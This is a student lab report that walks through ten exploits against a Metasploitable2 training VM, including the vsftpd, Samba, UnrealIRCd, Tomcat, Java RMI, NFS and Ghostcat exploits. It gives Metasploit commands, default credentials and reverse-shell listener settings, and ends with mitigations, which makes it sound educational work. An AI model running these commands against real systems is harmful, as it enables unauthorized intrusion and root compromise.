# Exploitation & the Cyber Kill Chain

**Name:** Azindo Abdul Razak
**Index Number:** 4186224
**Date:** 21/09/2026
**Target IP:** 10.0.2.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, Nmap, SearchSploit, Netcat, and NFS client utilities

---

## Reconnaissance Summary

The first stage of the assessment was reconnaissance against the Metasploitable2 target at `10.0.2.3`. Nmap was used to identify open ports, running services, and service versions.

### Nmap Command

```bash
nmap -sV 10.0.2.3
```

The reconnaissance identified several vulnerable services, including:

* FTP
* Samba
* IRC
* PostgreSQL
* Bindshell
* Apache Tomcat
* Java RMI
* NFS
* Tomcat AJP

These services were subsequently investigated and exploited where applicable.

### Reconnaissance Evidence

[View recon.png](evidence/recon.png)

---

# Exploit 1 – vsftpd 2.3.4 Backdoor

## Service / Port

**FTP — Port 21**

## Vulnerability

The target was running **vsftpd 2.3.4**, a version associated with a malicious backdoor that can provide remote command execution.

## Tool Used

**Metasploit Framework**

**Exploit module:**

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

## Why This Tool Was Appropriate

Metasploit was appropriate because it provides a dedicated exploit module for the vsftpd 2.3.4 backdoor. The module automates the process of connecting to the vulnerable FTP service and triggering the backdoor.

## Steps

First, the target service was identified with Nmap:

```bash
nmap -sV 10.0.2.3
```

SearchSploit was then used to investigate the available vsftpd vulnerabilities.

```bash
searchsploit vsftpd 2.3.4
```

Metasploit was started:

```bash
msfconsole
```

The exploit was searched for:

```text
search vsftpd 2.3.4
```

The exploit module was selected:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

The target IP was configured:

```text
set RHOSTS 10.0.2.3
```

The local attacker IP was configured:

```text
set LHOST 10.0.2.15
```

The exploit was launched:

```text
exploit
```

A Meterpreter session was successfully obtained.

The session was verified using:

```text
getuid
```

```text
sysinfo
```

```text
pwd
```

The session provided root-level access to the target.

## Evidence

[View exploit1.png](evidence/exploit1.png)

## Cyber Kill Chain Stages

* **Reconnaissance:** Nmap identified the FTP service and version.
* **Weaponization:** The Metasploit vsftpd 2.3.4 backdoor module was selected and configured.
* **Delivery:** The exploit was sent to the vulnerable FTP service.
* **Exploitation:** The vsftpd backdoor was triggered.
* **Installation:** A Meterpreter session was established.
* **Command & Control:** The attacker controlled the target through the Meterpreter session.
* **Actions on Objectives:** Commands such as `getuid`, `sysinfo`, and `pwd` were executed.

## Outcome / Impact

The exploit successfully resulted in a **root-level Meterpreter session**. The target was identified as Ubuntu 8.04 running Linux kernel `2.6.24-16-server` on an i686 architecture.

---

# Exploit 2 – Samba Username Map Script Command Execution

## Service / Port

**Samba — Ports 139 and 445**

## Vulnerability

The target was running **Samba 3.0.20-Debian**, which is vulnerable to command execution through the username map script functionality.

## Tool Used

**Metasploit Framework**

**Exploit module:**

```text
exploit/multi/samba/usermap_script
```

## Why This Tool Was Appropriate

Metasploit provides a dedicated module for exploiting the Samba username map script vulnerability. It simplifies the process of delivering the malicious input and establishing a command shell.

## Steps

Nmap was used to identify the Samba service:

```bash
nmap -sV 10.0.2.3
```

Metasploit was started:

```bash
msfconsole
```

The Samba vulnerability was searched:

```text
search samba
```

The appropriate module was selected:

```text
use exploit/multi/samba/usermap_script
```

The target was configured:

```text
set RHOSTS 10.0.2.3
```

The payload listener was configured to use the attacker machine:

```text
set LHOST 10.0.2.15
set LPORT 4444
```

The exploit was executed:

```text
exploit
```

A command shell session was successfully created.

## Evidence

[View exploit2.png](evidence/exploit2.png)

## Cyber Kill Chain Stages

* **Reconnaissance:** Samba was identified through network scanning.
* **Weaponization:** The Samba username map script exploit was selected and configured.
* **Delivery:** The malicious request was delivered to the Samba service.
* **Exploitation:** The vulnerability was successfully triggered.
* **Command & Control:** A command shell session was established.

## Outcome / Impact

The exploit successfully produced a command shell on the target. The session was subsequently closed before a specific privilege level could be verified, so no specific privilege level is claimed.

---

# Exploit 3 – UnrealIRCd 3.2.8.1 Backdoor

## Service / Port

**IRC — Port 6667**

## Vulnerability

The target was running **UnrealIRCd 3.2.8.1**, a version containing a backdoor that allows remote command execution.

## Tool Used

**Metasploit Framework**

**Exploit module:**

```text
exploit/unix/irc/unreal_ircd_3281_backdoor
```

## Why This Tool Was Appropriate

Metasploit provides a purpose-built module for the UnrealIRCd 3.2.8.1 backdoor. It allowed the vulnerability to be tested and exploited directly against the IRC service.

## Steps

The IRC service was identified using Nmap:

```bash
nmap -sV 10.0.2.3
```

Metasploit was started:

```bash
msfconsole
```

The vulnerability was searched:

```text
search unrealircd
```

The exploit module was selected:

```text
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

The target was configured:

```text
set RHOSTS 10.0.2.3
```

The attacker IP was configured:

```text
set LHOST 10.0.2.15
```

The exploit was launched:

```text
exploit
```

The output indicated that the target appeared vulnerable and that the IRC backdoor command was being sent.

A Meterpreter session was successfully obtained.

The session was verified:

```text
getuid
```

```text
sysinfo
```

```text
pwd
```

The working directory was:

```text
/etc/unreal
```

## Evidence

[View exploit3.png](evidence/exploit3.png)

## Cyber Kill Chain Stages

* **Reconnaissance**
* **Weaponization**
* **Delivery**
* **Exploitation**
* **Installation**
* **Command & Control**
* **Actions on Objectives**

## Outcome / Impact

The exploit successfully provided a **root-level Meterpreter session**. The target was identified as Ubuntu 8.04 running Linux `2.6.24-16-server` on i686 architecture.

---

# Exploit 4 – PostgreSQL Payload Execution

## Service / Port

**PostgreSQL — Port 5432**

## Vulnerability

The target was running an older PostgreSQL database service that permitted authenticated exploitation using the PostgreSQL payload module.

## Tool Used

**Metasploit Framework**

**Exploit module:**

```text
exploit/linux/postgres/postgres_payload
```

## Why This Tool Was Appropriate

The Metasploit PostgreSQL payload module is designed to exploit PostgreSQL installations where valid database credentials are available and execute a payload through the database service.

## Steps

Nmap identified the PostgreSQL service:

```bash
nmap -sV 10.0.2.3
```

The scan identified:

```text
5432/tcp open postgresql PostgreSQL DB 8.3.0 - 8.3.7
```

Metasploit was started:

```bash
msfconsole
```

PostgreSQL exploits were searched:

```text
search postgres
```

The appropriate module was selected:

```text
use exploit/linux/postgres/postgres_payload
```

The target was configured:

```text
set RHOSTS 10.0.2.3
```

The database credentials were configured:

```text
set USERNAME postgres
set PASSWORD postgres
set DATABASE postgres
```

The attacker IP was configured:

```text
set LHOST 10.0.2.15
```

The exploit was executed:

```text
exploit
```

The module identified PostgreSQL 8.3.1 and uploaded a payload library to:

```text
/tmp/zMIyRoYv.so
```

A Meterpreter session was successfully obtained.

The session was verified:

```text
getuid
```

The working directory was checked:

```text
pwd
```

The result showed:

```text
/var/lib/postgresql/8.3/main
```

## Evidence

[View exploit4.png](evidence/exploit4.png)

## Cyber Kill Chain Stages

* **Reconnaissance**
* **Weaponization**
* **Delivery**
* **Exploitation**
* **Installation**
* **Command & Control**
* **Actions on Objectives**

## Outcome / Impact

The exploit successfully established a Meterpreter session with **postgres user privileges**.

The session did not provide root privileges, so the result is documented as PostgreSQL-level user access rather than root access.

---

# Exploit 5 – Exposed Metasploitable Root Shell

## Service / Port

**Bindshell — Port 1524**

## Vulnerability

The target exposed an unauthenticated command shell on port 1524. The service provided direct access without requiring normal authentication.

## Tool Used

**Netcat (`nc`)**

## Why This Tool Was Appropriate

Netcat was appropriate because the service exposed a raw TCP command shell. Netcat can establish a direct TCP connection to the listening service and interact with the shell.

## Steps

The service was identified using Nmap:

```bash
nmap -sV 10.0.2.3
```

A connection was then established:

```bash
nc -nv 10.0.2.3 1524
```

After connecting, the identity of the shell was checked:

```bash
id
```

The current user was also checked:

```bash
whoami
```

The shell returned:

```text
uid=0(root) gid=0(root)
```

## Evidence

[View exploit5.png](evidence/exploit5.png)

## Cyber Kill Chain Stages

* **Reconnaissance:** Nmap identified port 1524 and the bindshell service.
* **Delivery:** A TCP connection was established to the exposed service.
* **Exploitation:** The unauthenticated shell was accessed.
* **Actions on Objectives:** Commands such as `id` and `whoami` were executed.

## Outcome / Impact

The connection provided a **root shell** directly on the target.

The result demonstrates the serious risk of exposing an unauthenticated root command shell on a network service.

---

# Exploit 6 – Apache Tomcat Manager Upload Code Execution

## Service / Port

**Apache Tomcat — Port 8180**

## Vulnerability

The Apache Tomcat Manager application was accessible using default credentials, allowing a WAR file to be uploaded and executed.

## Tool Used

**Metasploit Framework**

**Exploit module:**

```text
exploit/multi/http/tomcat_mgr_upload
```

## Why This Tool Was Appropriate

The Metasploit module is specifically designed to exploit the Tomcat Manager application by authenticating to the management interface and uploading a malicious WAR file.

## Steps

Nmap was used to identify the Tomcat service:

```bash
nmap -sV 10.0.2.3
```

The Tomcat Manager exploit was selected:

```text
use exploit/multi/http/tomcat_mgr_upload
```

The target was configured:

```text
set RHOSTS 10.0.2.3
set RPORT 8180
```

The Manager path was configured:

```text
set TARGETURI /manager
```

The Tomcat credentials were configured:

```text
set USERNAME tomcat
set PASSWORD tomcat
```

The attacker machine was configured:

```text
set LHOST 10.0.2.15
set LPORT 4444
```

The target was checked:

```text
check
```

The exploit was executed:

```text
exploit
```

A Meterpreter session was obtained.

The session was verified using:

```text
getuid
```

```text
sysinfo
```

```text
pwd
```

## Evidence

[View exploit6.png](evidence/exploit6.png)

## Cyber Kill Chain Stages

* **Reconnaissance**
* **Weaponization**
* **Delivery**
* **Exploitation**
* **Installation**
* **Command & Control**
* **Actions on Objectives**

## Outcome / Impact

A Meterpreter session was successfully established as the **tomcat55** user.

The target was identified as Linux `2.6.24-16-server` on i386 architecture.

The session did not provide root privileges.

---

# Exploit 7 – Java RMI Server Insecure Configuration

## Service / Port

**Java RMI Registry — Port 1099**

## Vulnerability

The Java RMI service was configured in a manner that permitted remote class loading, allowing malicious Java payloads to be delivered and executed.

## Tool Used

**Metasploit Framework**

**Exploit module:**

```text
exploit/multi/misc/java_rmi_server
```

## Why This Tool Was Appropriate

Metasploit contains a dedicated Java RMI server exploit module that can test for insecure remote class loading and deliver a malicious Java payload when the service is vulnerable.

## Steps

Nmap was used to identify the Java RMI service:

```bash
nmap -sV 10.0.2.3
```

The Java RMI exploit was selected:

```text
use exploit/multi/misc/java_rmi_server
```

The target port was configured:

```text
set RHOSTS 10.0.2.3
set RPORT 1099
```

The local payload server and attacker address were configured:

```text
set SRVHOST 10.0.2.15
set LHOST 10.0.2.15
```

The target was checked:

```text
check
```

The check indicated that class loading was enabled and that the target was vulnerable.

The exploit was executed:

```text
exploit
```

Metasploit served the malicious payload JAR to the target and a Meterpreter session was successfully obtained.

The session was verified.

## Evidence

[View exploit7.png](evidence/exploit7.png)

## Cyber Kill Chain Stages

* **Reconnaissance**
* **Weaponization**
* **Delivery**
* **Exploitation**
* **Installation**
* **Command & Control**
* **Actions on Objectives**

## Outcome / Impact

The exploit successfully resulted in a **root-level Meterpreter session** with:

```text
uid=0
```

This demonstrated that the insecure Java RMI configuration could lead to remote code execution with root privileges.

---

# Exploit 8 – Unrestricted NFS Root Filesystem Export

## Service / Port

**NFS — Port 2049**

## Vulnerability

The target exported its root filesystem through NFS without sufficient host restrictions.

## Tools Used

* `showmount`
* `mount`
* Nmap

## Why These Tools Were Appropriate

`showmount` was used to enumerate NFS exports, while `mount` was used to access the exposed filesystem. These tools were appropriate because the vulnerability involved an improperly restricted NFS export.

## Steps

Nmap was first used to identify the NFS service:

```bash
nmap -sV 10.0.2.3
```

The available NFS exports were enumerated:

```bash
showmount -e 10.0.2.3
```

The target exposed:

```text
/
```

The mount point was created:

```bash
sudo mkdir -p /mnt/msf_nfs
```

The exported filesystem was mounted:

```bash
sudo mount -t nfs 10.0.2.3:/ /mnt/msf_nfs
```

The contents were inspected:

```bash
ls -la /mnt/msf_nfs
```

The mount configuration confirmed that the filesystem was accessible with read/write permissions.

## Evidence

[View exploit8.png](evidence/exploit8.png)

## Cyber Kill Chain Stages

* **Reconnaissance**
* **Delivery**
* **Exploitation**
* **Actions on Objectives**

## Outcome / Impact

The target's root filesystem was successfully mounted on the attacker machine.

This provided access to sensitive directories and files, including:

```text
/etc
/home
/root
/var
```

The root filesystem was also exposed with read/write access, significantly increasing the potential impact.

---

# Exploit 9 – Apache Tomcat Ghostcat

## Service / Port

**Apache JServ Protocol (AJP) — Port 8009**

## Vulnerability

The target's Apache Tomcat AJP service was vulnerable to **CVE-2020-1938**, commonly known as Ghostcat.

## Tool Used

**Metasploit Framework**

**Auxiliary module:**

```text
auxiliary/admin/http/tomcat_ghostcat
```

## Why This Tool Was Appropriate

The Metasploit Ghostcat auxiliary module is specifically designed to test and exploit vulnerable Tomcat AJP services by requesting files from the target server.

## Steps

Nmap was used to identify the AJP service:

```bash
nmap -sV 10.0.2.3
```

The Ghostcat module was selected:

```text
use auxiliary/admin/http/tomcat_ghostcat
```

The target was configured:

```text
set RHOSTS 10.0.2.3
set RPORT 8009
```

The target file was specified:

```text
set FILENAME /WEB-INF/web.xml
```

The module was executed:

```text
run
```

The target returned the requested file contents, which were saved as loot by Metasploit.

## Evidence

[View exploit9.png](evidence/exploit9.png)

## Cyber Kill Chain Stages

* **Reconnaissance**
* **Weaponization**
* **Delivery**
* **Exploitation**
* **Actions on Objectives**

## Outcome / Impact

The exploit successfully disclosed the contents of a protected Tomcat configuration file.

The result demonstrated **arbitrary file disclosure** through the vulnerable AJP connector.

No shell or privilege escalation was claimed from this exploit.

---

# Exploit 10 – vsftpd 2.3.4 Backdoor Exploit

## Service / Port

**FTP — Port 21**

## Vulnerability

The target was running **vsftpd 2.3.4**, which contains the known backdoor that can be triggered remotely to obtain command execution.

## Tool Used

**Metasploit Framework**

**Exploit module:**

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

## Why This Tool Was Appropriate

Metasploit provides a dedicated exploit module for the vsftpd 2.3.4 backdoor. The module automates the process of targeting the vulnerable FTP service and triggering the backdoor.

## Steps

The FTP service was identified using Nmap:

```bash
nmap -sV 10.0.2.3
```

Metasploit was started:

```bash
msfconsole
```

The vsftpd exploit was searched:

```text
search vsftpd 2.3.4
```

The exploit module was selected:

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

The target IP was configured:

```text
set RHOSTS 10.0.2.3
```

The attacker IP was configured:

```text
set LHOST 10.0.2.15
```

The exploit was executed:

```text
exploit
```

A Meterpreter session was successfully obtained.

The session was verified:

```text
getuid
```

```text
sysinfo
```

```text
pwd
```

The session provided root-level access.

## Evidence

[View exploit10.png](evidence/exploit10.png)

## Cyber Kill Chain Stages

* **Reconnaissance:** The FTP service and vulnerable vsftpd version were identified.
* **Weaponization:** The Metasploit vsftpd 2.3.4 backdoor exploit was selected and configured.
* **Delivery:** The exploit was delivered to the FTP service.
* **Exploitation:** The vsftpd backdoor was triggered.
* **Installation:** A Meterpreter session was established.
* **Command & Control:** The attacker interacted with the target through Meterpreter.
* **Actions on Objectives:** Commands such as `getuid`, `sysinfo`, and `pwd` were executed.

## Outcome / Impact

The repeated exploit successfully produced a **root-level Meterpreter session** on the Metasploitable2 target.

The target was identified as Ubuntu 8.04 running Linux `2.6.24-16-server` on i686 architecture.

---

# Cyber Kill Chain Coverage Summary

| Exploit                                | Reconnaissance | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
| -------------------------------------- | -------------- | ------------- | -------- | ------------ | ------------ | -- | --------------------- |
| **1. vsftpd 2.3.4 Backdoor**           | ✔              | ✔             | ✔        | ✔            | ✔            | ✔  | ✔                     |
| **2. Samba Username Map Script**       | ✔              | ✔             | ✔        | ✔            |              | ✔  |                       |
| **3. UnrealIRCd 3.2.8.1 Backdoor**     | ✔              | ✔             | ✔        | ✔            | ✔            | ✔  | ✔                     |
| **4. PostgreSQL Payload**              | ✔              | ✔             | ✔        | ✔            | ✔            | ✔  | ✔                     |
| **5. Exposed Root Bindshell**          | ✔              |               | ✔        | ✔            |              |    | ✔                     |
| **6. Tomcat Manager Upload**           | ✔              | ✔             | ✔        | ✔            | ✔            | ✔  | ✔                     |
| **7. Java RMI Server**                 | ✔              | ✔             | ✔        | ✔            | ✔            | ✔  | ✔                     |
| **8. Unrestricted NFS Export**         | ✔              |               | ✔        | ✔            |              |    | ✔                     |
| **9. Tomcat Ghostcat**                 | ✔              | ✔             | ✔        | ✔            |              |    | ✔                     |
| **10. vsftpd 2.3.4 Backdoor** | ✔              | ✔             | ✔        | ✔            | ✔            | ✔  | ✔                     |

---

# Lessons Learned / Mitigations

## 1. vsftpd 2.3.4 Backdoor

* Remove vulnerable versions of vsftpd.
* Upgrade to a supported and trusted version.
* Verify the integrity and source of installed packages.
* Avoid exposing unnecessary FTP services.

## 2. Samba Username Map Script

* Keep Samba updated and patched.
* Disable unnecessary SMB services.
* Restrict ports 139 and 445 to trusted networks.
* Apply least-privilege principles.

## 3. Exposed Root Bindshell

* Disable the service if it is not required.
* Block port 1524 using appropriate firewall rules.
* Never expose an unauthenticated root command shell.

## 4. PostgreSQL

* Restrict PostgreSQL access to authorized hosts.
* Use strong database credentials.
* Keep PostgreSQL updated.
* Avoid running services with unnecessary privileges.

## 5. NFS

* Restrict NFS exports to authorized hosts.
* Avoid exporting the root filesystem unnecessarily.
* Avoid unrestricted read/write exports.
* Apply appropriate filesystem and network access controls.

## 6. Apache Tomcat Manager

* Disable unnecessary management interfaces.
* Change default Tomcat credentials.
* Restrict access to the Manager application.
* Keep Tomcat updated and securely configured.

## 7. Java RMI

* Disable remote class loading when it is not required.
* Restrict access to the RMI registry.
* Keep Java applications and dependencies updated.
* Avoid exposing RMI services unnecessarily.

## 8. Apache Tomcat Ghostcat

* Update Tomcat to a version that addresses CVE-2020-1938.
* Disable AJP when it is not required.
* Restrict access to AJP ports.
* Apply appropriate network segmentation and firewall rules.

---

# Conclusion

The assessment demonstrated how vulnerable services running on Metasploitable2 can be identified and exploited using common penetration-testing tools.

The exercises covered multiple stages of the Cyber Kill Chain, beginning with reconnaissance and service identification and progressing through weaponization, delivery, exploitation, installation, command and control, and actions on objectives.

The assessment also demonstrated different types of security weaknesses, including:

* Backdoored software
* Remote command execution
* Weak authentication
* Exposed root services
* Insecure database configurations
* Insecure Java RMI configuration
* Unrestricted NFS exports
* Web application vulnerabilities
* Arbitrary file disclosure

